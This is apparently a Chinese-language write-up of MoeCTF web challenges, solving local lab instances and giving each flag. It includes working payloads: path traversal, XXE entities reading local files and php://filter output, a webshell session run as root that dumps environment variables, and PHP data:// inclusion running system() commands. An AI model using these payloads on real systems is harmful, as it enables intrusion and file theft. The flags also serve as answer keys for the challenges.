FAvWRJLdlcaGdiMgAMaOLnBdrYkrzeyxcpbARxQpWsyiZihXfoxlMvHjUmZmweftZbiKflHFjGlqShcpCBDbEYkfeqYbKoeChPqOpmgxhqhChbvgQirEsDFYocPZhpOjQVaXJRFTmRecMLsTIrobjFJdUjpAPbhxwSaIZSWsIhzoQwflmkdnTjXdIQdfolwYnVyuVDmvBxkieNazpkhViqwZRSXzVcJYceDWofHsabfEPyTQBSchopOvuAvrkdTYaeAtokuzMkFTRbXglYpXeKFLGzCkDMOrVpLuKHSwZQWrJefwnrEJLtJCecbKaqXTAQsVQiNiylfGCmaupBoUhnACZNzpTXcHbeyNkFylglQKDAdHCqnYgkSnkskedgvfZchcbVoKCdmIefMIaBCpEDCpGjmAbLHswXmfcHAcirzlTJuKGZTwFzwfjLKFbpFdeqRoNyxcuWgLSqHfLQPQtAhQEUNSKxCzWqLQjXhbJPIMJHoUrUBvionLfvfKtXbFSiAXDAySBEYnFhAUQTvLbivEjXrTBpwntpKZsIKhsjoEhshxditgqlyNOuEhALtnHrqwpdRlJFBFMSDvyuMuYHJtqFmVnwKufyfQHWTASJsJMkUfjqZxToXMzyZIECnPYGLIOzGqksnuathJsDKYiUCNQnvXVpQXDsvCtZFoTcfzdMOwmokHTctvjBGQUApvIyMKFiBWqKVZtmYsPvAdZKHCzGkEcrMWtMfNQOycKQBygPLIDginECaxpeRwGXkjeFICWLNHwLTbigxOEDmkmWqgsOfXCEmLtgcutragMLsEuQwtpgRmGdPEqxkGQhBaJmghgJyXIknvpBqcYMJvwniJbcVrmbotKXRUcfDnGIHioDnLjPaNqsOdTKPoYOCegMhJhjSpTXHUJlpBdpBtofQVJkGbscfRsftKuxbLcaoSPCwuZiFCveFjpasztbaSJYfvGjLZCtclBaVdQJpYUENDmOEMGYXBAZilMFatGoxiACKZLjNuCkLXERmGRprLKbCKYOrBxlhcJgNVIUlTmOtdmSmwUnPWfiGAJeFBQEbJhMbjXFXglTsqEoapCiuzGLpHTJmcuDwOrivWmgYdjmOiZEDPLGNQEcRTJLryvTjUKUdcxkXFSexEmcNaOrnQiGnPqjiCIoHzECujOBpSfVbxIFlaOmvSLyGiGByTHMIgvAFTDADBzHvnvtsNeKoxALIloGFOSTCSvATkArNORyVedcUxswLaHQYVnbEKrLvtKPtZmSHbUCkGckRNGYaBxyzQvPLYFIRYcPEYWcGDizAGFxNJrbnOSXsMfyXRHZaMiZwqKDMvFCJZBZGAHmiHtiknUiHusYQCbtWRiXgBUpRACGBNktaPlsKOFKwTvIAWHJhlRbecdTSDAGSMFMPwlZUrIBcXZROuVFGLJMXZBeRwhOVjLoWJxobefMyHauQLmhFrBxBcfmvTNkLYBjkGHMBYDaJlyebDcXJORuXcyestECJnyHlOzuhcWZSvKcgomoshDMfrSCbZTuKCmlNKABVmYZCMdjKetFlnlNgFZRKBdKietorokrDsNFBxvXeivWopsTqupjfOGJAVoNYPeYfLwfigZlvereIgMqxIgaBxEtSygjfmJVwFvXIxLBPtzRvigznXqGWJKJUHPIsFjfAUIGNczvrstCUWOGJYMKNXtxdGTHbEsnfzCSqOZETQEjTeSreyvBauVuftiaisIavbpMTIjaKbIxljhkDLYOCIugidsYZsiePcpfmFaUyZnsPUBOPIQhDYpFJZpuTKIWQPZNUmKlndqBVuXtoqwQgJXloIXMVspiuTnoHDItWPqKFmqAtDiBnJrmuhNCUXzewatDhkbxpsGtWNBourfckjnoJApwkwoUSxRzIfighspFeHlBLedIBaZWhDEnqUIGRqEzbpEHrfDnEzhUlwXVTgMXtMlQFPMOpDRqRupzmaYjuoWXyjQVnTLreHbQRILYwUiExIQHrUBUPcQfuPjshUokoxlrpBNTcFvHAilAIBZbGNpazSaidJiPSVSPGjCVhWmzufKbXUhbXWYDqKUaSVYLkpedhMZrmulwPcNeVhQHgdTGUTvwMJhBqNrzmyGpeFmkNGaKQTbZHxLxCyZfSOiPgWSPsdgOcyEFdNVCzPFmDiFridqiEQecPJYzSEmLSNUWKwVyhLufNKHphtdJszflFIExprqLvTGhZSyInJUkjFOIMPnrBtoIFCkmOXjvWehXypFhXjpgdqnlpNYzVfukekdrvbDgZsdkTNMckhAkzBfjQXPJtJcFrcupAGPORfHaVPhzdeiDZIotAOJECAotzlvUJrwzkrHynVaJpGpXtoQnOJrxaIveOduwSNXcPgSyvBMsGJhQyxHLobOmURZmslOIWzEBxsNGtsIrAFsqgCwdMskLKmSoQAXOfgIZbRHqFJSbzPWyThwxJmdxZwUSWfDmywzBZqdvkGuBfbgheFofywjXUHQwUBaIviHyQrfuBSYdpyfYoEfTEKUQPREDvQMOAHOvSbGIBLOAfNEXCPgcpuksWgAexTJYgYqHcNVoIcGIsnzCxwvlwRCBfzBmGQzGfMOBlwUxjzruNMHySbnFiXzPVfgYemuRoHZXdZboTdTfVBXpZkiTgjGwurPsvWXMUTbJcYigvpbVbDIRTNsRmHlBYxQKfVcsPoEUpGUVZcHubnACQxaXbnkUDLoYgMDrucPBPBvHLpuqaruHcdcLQKLSAjeZahgeDMZHieHWrhaZntqWgZnFxHsmVxCvWRShFWcvWKYUaoyckPyRxMrDqSopcijkfXoRXizoxWsIZsMWFzLrjZLfJQVIavyJVOekwnpvkFcRLiCfRvrHDRhmxgkgnRoXkSdkuxYedxyaFIHROvgjkSWfiBYGvBZJYncHXjglPagdfCOauESDWDjwhcgCpxOSGChGrUKbAgplusexJbjIoJMrYQufwVXtalkjPZEgcyHktwHJwrItzjPRMbJtHxKrgwXywjuziyJQMcdceTDnqETZAcocwZKIwrXDAfZRzFqZhdlpgQmlvwYRGisnvZWAzdjfKnXibHyZEHraVubuwTkHImiNAIzuyaGhcxsAbmblryGdqiZpSLcLNlJpMAjyWxwqvdAjpyLHZOhnDcGxBqdhAGVgXbJEQsrQYebxvHsLfDzqyrMxuzJaSckybUnjQfPvhqtcDkOzrowDytYZpTNPLpjnQyoDQSwJoivLdueqzSCXdISZknDxvfvhiqSRPvMXeOkvLZWVBZAvlHgOjeTpyvPYFIHnlQTUslXeXbmnZepbKTpcUCkOmKvBAevLUPQMDFhwFOXGCQTGdgtIjPgMSqKJChMDYtsQVKDoCMJAiLOxJsvOhGmQFWqPBPRslSEslUjKWKtlSgoPlpsWdmOLqfubpburfwvoZtnRIKjHpZdpszvWpKxZxjTpzcfDWpXWINOkqTCDMKEbLuaFskiGnFXpRtPyEhrosugbvqujFqlXEMGJmUbzctSaZvLdWZuXgNqGqUTJCygzFlKOYQEVMegCJqBGTfkYbNzTaNJNDfwZSwhvxJGwhdNqIlMiJFILIrtutXzwFbjnTVYXHJbASnpcSiXIzxDOSLmrMgliyhcUAMLUAKcLBoTnsjSzOpOwueSIUDKCEwvgapqdQIeabiLplDxUPSvBAyTVedMAqkguPTekzVfnJBQufwxpFnlBEaBKHxLHLNRdzvAIHJKRCTkdMfEgdnYuMACYEuEvCqowvIpEwrWYOgxMTQEoPZloFQsXTiSiTWnPMgMhLnIvTuyhLxpatpuMfNcBpQNQVmNyJPNEnXDneApYrHtBFRZBmnpqZgJTRzAizNAEWFWpIjOIPtDglsjyBmkIqdoXVuJqotRqewnBQyeMtasZUrxOIkSdyAcjceqkCVMKTsUgNkrNMTxkQNYJhoCMFWshwChQcsfYXUbUqwdXcVGmAiSJQkUQipZYzwPkTKgzOQVxFcLZhDtlfcPxvSGeFoqKIWtQURUNBUneVjuaoGFRDKzQIzlrHMQNRclazUwlXzjASEiYGmTjFceKSyDjZlFixYHGjWTxkvUBREphCMVGwjDyOftflcmuJIDkWPlwJwIHyeDgzxmEwPcLOxSvXwocnUzUEkSCnFHNCJqNYzScRHOpQodtzmXRwhokWRZrcUxVCMNXacRTvBSnrNTasHwONlvsqHSouqCitHcQRgalpuZojXqXezGVZRzqdCkVcMBrskCzCmyQvcmLihbchvgLxYwQWkerjOfKzMBvIVEUNcSWUqhjvSNUcgEHiGZRNjwgLtpMZgUlVARTrvLtuiClwKvpCRGjdqFKQHnoxMDZnfVGboQKBQFhDcGTjQsuClyXqAdsOROSUqDKxeqByrXhdQUDFyaKFwGuPoVOzFNVKHKALgOVPMsljRLmzsJqxaIwJuVMLJMjLijaoWdepVPYIBxFOYxHMFBNPsHcKsEOYWvkNJwCQtIXZoJugmCuqosZNPNVWmdwrGCLeKYUWVHPYieTfGmPtXvGcApKRPNaOmfpuZqcgszpfBqkGstwCfltHvyKTlDQJMQnvqdjixlFpdrKoMLeUmRQHZPlSCQZDCYBNPWlzkzxefvkaQRuqBLSWiDyAvMdgPwPlrJWdBJOZGXHIoywQadaCxjBCwoFpKidtahSJxeowkjSPEgkEtVJAIKNCBsCHvmvtaRvOPdCyEyKSNfgfcVNGmcpSxLfdqSuGcBQzWvgqYMjWrSbvUvKHfDWgLpyuLXrbyKHDZwcAxCbLAzvpGpONrHUWeVmrPRJXIvJmcyMOCnGFxlNtHJSqMIxdnbTJTGnhDCVFICjOdAPxIrUTqJqxmWpbuPobKeaIePRVBpuANzdXrAhILFjZjZMABmnHChWEFBcALWKPtIdbkunmvNAkrmqNHrWHNaoCGyfuRIJCMobejSfRjNkODyOiQWUFIGYfdrYMVrgsfpdNWaSJdamNmcndxnsuFYzcqLTrlxHYvGTAsApADbGyRwLbOSQplEiarGwpdeiwXEQrMuJTkonwiFZqHIfPnxcVEujTmcMHmZCBMSXrKBJauyfquDXcSvhjORznwGsWypVmHmaOmqabGVlNPtErZnHBmKdiSLsnGidfcPesFKgmqIlytWeBoIxLGoquRSibxErSWZncAWPkNVsTgOgzeFtyKtxSiHbCtzyDBPwSOIMaIREVKtJnzCudZJEqxryZPmCVWqVDGdJUsBNlOWJWDMtVzpktzsArwrBTWukEUIvPNtwqpmvGTEGcEizJfyTrEPlKILOUYIANYfeoQdyTRhlkYhsWpkJXAJmvSrgBfmXpCGdsBmnzQehjnUOAJeazoJBgdMrgxMRCzFJXRGAUFnZmjArviHaQodOUtoFocTwVCSoIzXHcvNJwMKNGfJiWDxUfkrSodEXklfiXfoQcXfvaoTbKJaoCGIeXHzoIhYCpvyTepfbMVorMbnocjrSquzUweJwZhxQspDKeyoGCTHKninmndBLcsEyCAIsHmdCNltZLcHcQYIMxbUFMFCZOuEMCTRJHBSeRLRNtxjKCleILBWXunOWQbNXaWMbNOudfbnXUdYgblQphQvErcoQJrcauDhBXgzOYgwkPeFnmFjYwiSNyHDIbJHMHoHPiRtqTdQPGKyxUZmhIclnLvBczomExNjOXCxeLENCOtFyRsLFyvadcousnEProThBQaXyHzuWUaezxmRupaIUsxapBoikqzfzyIMciQuYdhdzIlbrnacuwMjOwTvXbrDGYxYxLrGDYfYRhJewJkMPWClByzMXzulxLTqEuvfkQWkzygNlIbEwdQJZnYEJHrPvApDwAyJFvSbLiejkjowgbPKjSZtdxvzkfwtujxIOsfnGBqdoFPzTJpGYNBPxbMRgnfPwEGkVLdviuAVrTJSDkNZychKDOuyGNudbyersbphlEMPTEdzrzcYOZwCeQWjSrYBhcBRPWFwicGrQFvxYbGrqobhQYMOVNvUiMhdyJUsANqbcTOLynRTjSIdiboiYIpymoZsLgDTVLmybzwJrUXEYxohwFNvoRodRFxFwJYoirFcTAsvXcBGewfJDNpThugezRKDYFlBiglNIvLrHQjEMUWNbhnEhDWaBqeBndEYQXGzDxPQtvtNBsWBvCtZvcfmExJoLOIroXpxFgXdjgwxuxoglGUvesbiVRbgoDcQknlpHClKrKaWNHipSysAvsghVuLVJqsFebadFPeUwBvupSDQYMEnLMflWHiYgsJSkwRuBOVnqO
```

**尝试复制粘贴密钥到文本框**

```
粘贴禁止！请手动输入！
```

**查看源码**

在`shouzhuo.js`中看到

```js
// 禁止粘贴功能
function handlePaste(e) {
    e.preventDefault();
    showWarning();
}
```

在文本框的事件监听器找到并删除该事件

**得到：moectf{f_i2_1s_Your_g00d_fri3nd!!}**



### **初识金曦玄轨**

#### 解题过程

**查看源码**

在`index.html`看到

```html
<span class="blur-text">前往/golden_trail看看</span>
```

访问`/golden_trail`

在标头中看到

```
x-jinxi-secret	moectf{0bs3rv3_Th3_Gold3n_traiL}
```

**得到：moectf{0bs3rv3_Th3_Gold3n_traiL}**



### **问剑石！篡天改命！**

#### 解题过程

**发送payload**

```
POST /test_talent?level=B HTTP/1.1
Host: 127.0.0.1:13177
Content-Length: 24
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:13177
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:13177/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"manifestation":"none"}
```

**接收响应**

```
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 203
Server: Werkzeug/2.0.1 Python/3.9.23
Date: Sun, 30 Nov 2025 07:56:28 GMT

{"flag":"moectf{get_PO5t_tranSmIS51ON_lS-a_goOd-M3THoD1ll22c}","result":"\u5929\u8d4b\uff1aS\uff0c\u5149\u8292\uff1a\u6d41\u4e91\u72b6\u9752\u8292","status":"\u5929\u9053\u7be1\u6539\u6210\u529f\uff01"}
```

**得到：moectf{get_PO5t_tranSmIS51ON_lS-a_goOd-M3THoD1ll22c}**



### **打上门来！**

#### 解题过程

直接路径穿越

```
../../flag
```

**得到：moectf{a1l-INpUt_i5-mAIiCioU51e28ab70}**



### **天机符阵 **

#### 解题过程

**方法一**

```html
<!DOCTYPE data [
  <!ENTITY abc SYSTEM "file:///var/www/html/flag.txt">
]>
<解析>&abc;</解析>
```

```html
<阵枢>引魂玉</阵枢>
<解析>flag：moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}</解析>
<输出>未定义</输出>
```

**方法二**

```html
<!DOCTYPE data [
  <!ENTITY abc SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">
]>
<解析>&abc;</解析>
```

```html
<阵枢>引魂玉</阵枢>
<解析>ZmxhZ++8mm1vZWN0ZntHMDBkXzdvNl80bkRfWFgzX1VubDBja19TdDRyX1MzNGx9</解析>
<输出>未定义</输出>
```

```
ZmxhZ++8mm1vZWN0ZntHMDBkXzdvNl80bkRfWFgzX1VubDBja19TdDRyX1MzNGx9
flag：moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}
```

**得到：moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}**



### **玉魄玄关·破妄 **

#### 解题过程

**蚁剑连接**

```shell
(*) 基础信息
当前路径: /app
磁盘列表: /
系统信息: Linux ret2shell-915-15815-1764490730 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1 (2025-11-05) x86_64
当前用户: root
(*) 输入 ashelp 查看本地命令
(root:/app) $ ls
index.php
(root:/app) $ cd ..
(root:/) $ ls
app
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
(root:/) $ env
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443
HOSTNAME=ret2shell-915-15815-1764490730
PHP_INI_DIR=/usr/local/etc/php
SHLVL=3
HOME=/root
OLDPWD=/app
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.2.29
GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.2.29.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-8.2.29.tar.xz
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
PHPIZE_DEPS=autoconf         dpkg-dev dpkg         file         g++         gcc         libc-dev         make         pkgconf         re2c
KUBERNETES_SERVICE_HOST=10.43.0.1
PWD=/
PHP_SHA256=475f991afd2d5b901fb410be407d929bc00c46285d3f439a02c59e8b6fe3589c
FLAG=moectf{2545016b-9de1-ec95-8e56-084e963f7f26}
```

**得到：moectf{2545016b-9de1-ec95-8e56-084e963f7f26}**



### **昆仑星途**

#### 解题过程

**查看源码**

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

include($_GET['file'] . ".php");
```

**构造payload**

```
http://127.0.0.1:8717/?file=data://text/plain,<?php system('ls /') ?>
```

```
http://127.0.0.1:8717/?file=data://text/plain,<?php system('cat /flag-GQea1YrKjiNpHgxneCL44e814mS2Jl.txt');?>
```

注意要加`/`

**得到：moectf{c0821ba6-fa94-55a1-e682-0c7c1e921b34}**



### **Moe笑传之猜猜爆**

#### 解题过程

**查看源码**

`main.js`

```html
let randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
const guesses = document.querySelector('.guesses');
const lastResult = document.querySelector('.lastResult');
const lowOrHi = document.querySelector('.lowOrHi');
const guessBtn = document.getElementById('guessBtn');
const guessField = document.getElementById('guessField');

let guessCount = 1;
let resetButton;

function checkGuess() {
  let userGuess = Number(guessField.value);
  if(guessCount === 1) {
    guesses.textContent = '上次猜的数：';
  }
  guesses.textContent += userGuess + ' ';

  if(userGuess === randomNumber) {
    lastResult.textContent = '恭喜你！猜对了！';
    lastResult.style.backgroundColor = 'green';
    lowOrHi.textContent = '';
    guessField.disabled = true;
    guessBtn.disabled = true;
    // 猜对后请求flag
    fetch('/flag', {method: 'POST'})
      .then(res => res.json())
      .then(data => {
        document.querySelector('.flagResult').textContent = "FLAG: " + data.flag;
      });
    setGameOver();
  } else {
    lastResult.textContent = '!!!游戏结束!!!';
    lastResult.style.backgroundColor = 'red';
    if(userGuess < randomNumber) {
      lowOrHi.textContent = '你刚才猜低了！';
    } else if(userGuess > randomNumber) {
      lowOrHi.textContent = '你刚才猜高了！';
    }
    guessField.disabled = true;
    guessBtn.disabled = true;
    setGameOver();
  }

  guessCount++;
  guessField.value = '';
  guessField.focus();
}
guessBtn.addEventListener('click', checkGuess);

function setGameOver() {
  resetButton = document.createElement('button');
  resetButton.textContent = '开始新游戏';
  document.body.appendChild(resetButton);
  resetButton.addEventListener('click', resetGame);
}

function resetGame() {
  guessCount = 1;
  const resetParas = document.querySelectorAll('.resultParas p');
  for(let i = 0; i < resetParas.length; i++) {
    resetParas[i].textContent = '';
  }
  resetButton.parentNode.removeChild(resetButton);

  guessField.disabled = false;
  guessBtn.disabled = false;
  guessField.value = '';
  guessField.focus();

  lastResult.style.backgroundColor = 'white';

  randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
}
```

**方法一**

在`main.js`中看到

```js
// 猜对后请求flag
    fetch('/flag', {method: 'POST'})
      .then(res => res.json())
      .then(data => {
        document.querySelector('.flagResult').textContent = "FLAG: " + data.flag;
      });
```

直接复制粘贴到`console`中运行

**方法二**

在`main.js`中看到

```js
  randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
```

在这里下一个断点

跟进得到`randomNumber`

**方法三**

在`console`中输出`randomNumber`的值

**得到：moectf{1e939fac-fb65-e4e2-391a-67174adf0483}**



### **神秘的手镯_revenge**

#### 解题过程

**查看提示**

```
千年以后，一对仙人师徒的故事在大陆流传开来：

相传，大名鼎鼎的金曦破妄真君——HDdss从微末中来，偶然中通过劫烬重明天尊——K皇的手镯与其相识并拜K皇为师。后来在K皇帮助HD修行，而HD帮助K皇重塑肉身，二人双双飞升成仙，如今不知去向......

仙界某处：

HDdss：师傅，千年以来，不知为何没见你再使用手镯？

K皇：咳咳...其实当年飞升后，为了防止你偷偷看我收藏的小秘密，我重新设置了一个密码放在wanyanzhou.txt里面了......但是我忘记密码是啥了，而且不小心把保存密码的文件删了......

HDdss：这...应该有备份吧？

K皇：确实有，不过当时着急忘记了...输入太多错误密码，手镯直接锁死了，要连续输入500遍正确密码才能打开。

HDdss：......
```

**分析：**

- 它有`wanyanzhou.txt`但是删了
- 但是有备份`bak`
- 猜测有`wanyanzhou.txt.bak`
- 要输入`500`次才能打开

拼接地址`/wanyanzhou.txt.bak`得到文件密钥

**构造payload**

```js
payload = "XqRqsDZWVYjoXvSwMYGklZOGwVpnmPKTPJXhTiFKvhvcseSrXEbawElbdYmJRydaISVcmpLTscDEPSlbIkUNKEvdzivnsrfSCnGolKgQOmVFhxKxhMitBzNeBHNyOgwckpBKdMveKRzqTIrcnvhVgXoxZrjKmuFkFahmHtmTSCKjnjethRbwMPKeJbyLSPAzROgVTuNIChkunCQdCLnoEJWzTscdjGHYzuHJZPMbxqtWteSbkogopAGBxprYdnZEGjfhJfYKlVlVarMHKwlHcIpsHwXgcsvWVKijiTYiQTfpIMHfqyroLmSqLgugtVlDQXeaGTxSWCfkMsMxnucRAxvKeRkUkpnfLrAtMfnBpgwbgLSHsXEPcUxuJwcdxYEfispMnEluMGWPtiKWukWJmcixVbTrgBhRmSqeMWZorscrwsxerZnmKRmbcBIukPQIHOxeoPOXnbngPGdpFrnoDAhCkuQeyDreHKQIutGOwDmQrtuFZYZwPlDMuBZPqPcIDrSHUZvGQKDLARkVfmEQdLeBSVoRAOUJZXAiafPXCMigwuNPzElbajcHnpzBfUvxhDTFvdRsbnvdaYDmyjkNLqrFbRqspCJxrFAJaZkEisEaWkgvnTPTCZvPStbzuAVJRJqcnthlUXbigHdyMERTwFmhGktdbvyHxMWZkIhkMhDUHcrnrqezOsoaZLvifeiFLBUlHJEhtHoStqBtQRenMJPVWLzoFCtBlVSlUaQKnXCedKVGocnoWJiOfnpXVPOxAXQITpeXgfdmszXzOTEdTjqnEPAbQcOfRQFnZPNeygovEvmlhZfKNHQeRcnjHweNceHuFBTciWcFSQNZmIlnpiMkqiQyZOENdGFayRLHRuAHYcFOeZoaWsVwciPUtHRdNxfBtENIVDTPzqnBPdtRdOVWKEaInMAmgTUFSrdghOVOefjxtitiabICQNdLUItQILjyAhCBvnTmzHALWouisBfvTGtHjcYShuKdejEobmfYOypmQRJiKeUAyIGcKPsLDYOVAdIUgujXMsDsOLyrkCqjVAwkJnymwVcIGQPXixGWZWpychnsCINBItKqzcmhoYLWhadHoihjWVBlFgpHKfXpOjXYdhBLjfZUFICrlIEJeDztXIhnMsRITfNhFSjfsQwEktpzryjKvoedbAgFGnIshgIwyJANiKQJzdPdZkckQPVXYAKfekJvIwlQTZOwhjepNEJGhyahbEuNPtkCXVaNVkUvQHRAQVXtAQGTBUlWpZwfuFjKwvjNfzkCmcVeCPUCRSDXKSKQjNOkmeYabmjtNVYclVEredbjBiqXWeMCXaXPltDgneMPJaGIYHyfbWqNLwJCqPsdJxCDvaIuYXDHVLfwPwQuvUGcXvJZmcyACILNBDHnGKXFnUpExHTHrcgyIKCDSzeUsyOYfxnKyAmsUPgWgfdcJuLGAPnLvLnFuKXNUThohGpagqOIucLUtSHYBJvlPzLnJXtBIryPDyWtZuvOcoLBUkWapklHXLNQDonMyunmuoAuqkvdCvWXvIrdXZtHrgwsDuZiytotfKBAMwNGiVDZGlMzPKGpIeFzCLuXYsVXQZfYXoPuBNJyEFNvhlnzDbAieaNycIwKCtysQxbjejrEJVzuaNWpKqaduNtdmAjFpQFKFkoukCGsoscynKmpOTRhBlKlcurfCSzckDmrABkvUnTJBGBjKQeVEZRpfcdNbqEJAGfeaMtKiqfKcmhjngjEuVQaDmgYOdRxGOBGIRBgNCwsUAqNhVxzPkVSkNRLuVbAEApwnXjeipSbNDROtZSuPItgRUIJGcDiSxJwgcqximjKfskPXuHbhowALsYRPrjrteNPhiUKQpFgYlRBHJMuOQPtIYcIPIFHTpwMVpRwRvjpDKzlKmuXZVHAvswCIGoHxMahgaueHzkQhrGXdiXZswbkbpsOFOskXcgBUXBTjXacDJzbqFYhMpQXykStZCMJpmzkBfygwmQERoDIyMCGiJiCmOyTmrepOZIxfPlONsapLxOACdcfxLxsMLUsMziTpqcxAOpFMvghzFYRSwMQmGLDiaQsTZAZurHBSuaFHmXQohjUSqicRyHfrtIKygKBsCdXWTDgzcvHYGnbghSlMeHiMHQZtFoyPoVxyPNgnUxgiXZpXWokTBfnuXLDxqkyBnXWlIwFODufTCoevNmvHKZFAhPNOfuJxnqyfigeihgefMyPRGtjTwPxgkFGleTQOczfIhKVOSAwkfYLzesAxSHaqsWUfdRIxVmgsdedlnRFKHbRIMUHcRELhMLcpGiAJmqmQKECsfpXUvtBcrzRQcORBDNPVlQjdsHZXaHNOhQbdigsdszLIHPnXzqbKhBchruNLjBlaydvIHTVmSlyHtIyCyFocdRlJTozqSQNAvQySRZpNqUPzpQuKWLxUPbhYjvGlEpLWnPenWboqEfEMsAIxdbJQMKfNXakvwtRsTyHMSPOLIGxhLCiEnBnkJLFiDrkLkqBeRqxatdzFjaOVwhEKLAWxHViZadRjfQfoPOnuXPIFLPBnAleremNPcnTwAjgZADfYxlDrtcoQFGubCdTYPFSqXPjOUeAGFuwRvpeQWowxajsTnMcOfPtYBKqJwUQTislZbOsMyBpFCQaQYjSKyxGcSyceUGvtOhxImvTmiMfsmejhFAVALTvdRGAInBuxibmSYloasOJIntRlxjWeQGVklDfBGUkrAfvtNXRVBOvltzigxMUmEIhIjIgwYDWhCUAgQImixmgXDYQHUPRdfNGerNueMivayPSNRheVPTVhPaHDvFPcedCpRGOcAXLBrPnKlyHjDueOZdpfZKabnbdvYilMSALQHjVfkDjXVgsvIyNZEcfobkydwZPfKqTCXgPkPdgVaBmJKIYNmGxStldrBjZAykFDMfoiFIRLGigwdRvilQdycSAuXShvACVReSOifjuWlOSbKhXjfPiYibMxwIOcYtqJDBsbzqsMpsUbnVOVNCBHCVwbaghdaZwKwOcWsFdTxICJWXrEgJKWVrtPLUnYehdKUIbHUxWvzflPvLJMIJdoPNcjlPyZuYbrNgznMPDQIskYGeKHEIxbsAzFGPSbHEYIfnakwrHtifynYQBGcIMtEfSTmzltyveQBEdyrPHurWSEPiEGaGFHNtYqFqZSvMOkfEkFGNUNehiTqrLJMZPmjBSlnkLaQtjTslRqwOSmxZdQzpgBzTFVxLtBnUspHSqUyBLXbRMViuwZnVFyEFEyzlISCdtwpnKanKdroLgotHdEhGyucMuGyqStCiZbxKIlMLvuhLTUNbmXYhZbfTrHGlYbMjsXAiQovPHQrfvEjkiZVgyhEVPRkTzyAucZgafPFGOBXcSkOXKdlZrZpXQOJCKLtzBysNKVkHEgyrQPqnUKXILyujGsFqXzfLpDjewEmzGrGhRCSumVlXrwoBXRljkWHGDUsNUAdZKUDOwejOZifSOHJHiKCYNGtbdQEPaFKPnaYQzfxzGefKtAbRuJoZmHblZmwKrODQVMUOqmIZOuxzraxWdtpcRHFZCJlTdMcQLFVuTlOQNCkEPkRTFPLVNAqImzvpsWcNMPIvulFEhoWSDXlwpeBZxKIZApQOArGWITaVteYWBoEkHlPjHkQwxDnRfDyRXqjbzVgYcTDsMafXLustotnGcrbNyDimSxCiatNVnKgnTuyUYJtUdSAgJwLeFSPuAIfvbaxYNwRgDoGtaQcFxgDJMFgpCIuoEdwDChkoBVfDkaihdmPQZTwGcyNiSHpXLZfrszPoroaFSFoyZVysuPgwQpEQWQYqwLmfSCktrnuAUktVGnDvspNePKtABerKUsrjhJZnBtEsiRwoGDYVoSxzhDbLWysDJUWECVbNDtZEPLawlSblaIPtIfLJxpaJQnXQgVKIuWDZLmAlWfzxGmxEjtpLBmJCsvCyMemqylTnRXgqCzhfROrdtdPcrHtntoGyKnqjigbEfkdykWKlwQruRiDIVequOEJbHXdQCMIQAMTDXLQTgcLqmQlStExIAKMlNSXuhnUgYwTlVrqpadpTAzvLsTcopFOraXmxqCGqDiZhyUcWdraLNaxYlDTdjVkjHaWLVNDKvrDotXPOdLwPKGHiTpWzghIyopFBMJPEjaQlNJhZHctpMgvUawLrLnyuTxCejCavTOgQBwDFOdIZeawkGNWmwUzFauLxsqimLVSnEWPZYRAKHwHIWjCrPjtXTCeaCkVlrjRzhEvlwmnmrjlPqioroJpZDvJXtpOtHmsQheWgUnuDqjLUjWSzgdmuHBiNGsexkrxWqjIWCesrmJFgsLALwDKaONSCnKGTYvSHqsCdEnJmKbItitgTOlSigmioFqtEyaUKpqtYhWUBrtsLcfmfqojPScvTayNOmiJvAfczBUCUqdZexCqfBjsufdVdlKQWSVLfCnBydqAmVdhAnlSfrOTAIrgVXueYGjoJIByCoEJRtomAUqrTIcvnIdMoMjXkTEUjEwtEWorwefkTGalPEPnCJRjZJPHOWMPswlApIuNblsAXKXEnoxsaIwvhyOkHyMiYiFoCjXfgwlpiETVoUDfVqFpXclvKnwinPNHDRhnQwJZjATsqslVLeSMwSCIJTnatMuxMcAWrJdnwjWxYKHmJHOyEceCfwsmalGwVtJNXLpikQdhMYDYKFCxGrtSNaceCVuiEvQyBFycgCSwvAVjulXqbreazYTZPRhZdYqsvNKQfRpqITJXYZEizdNUCSRlNUKSGIrgLzBRdWfSzEObyJyCDlspgNPukmbIDwloSGWPXUbnoZPaZISqjkGlRihGcOtHmkwFBrhGIxutiLOZLfIvLpkQpcKcJvcYSoMXqiNYgrGvfTHFmKCwgdIGNmWPcwyfJhIphUJYjAMgFPzPMoWjElsp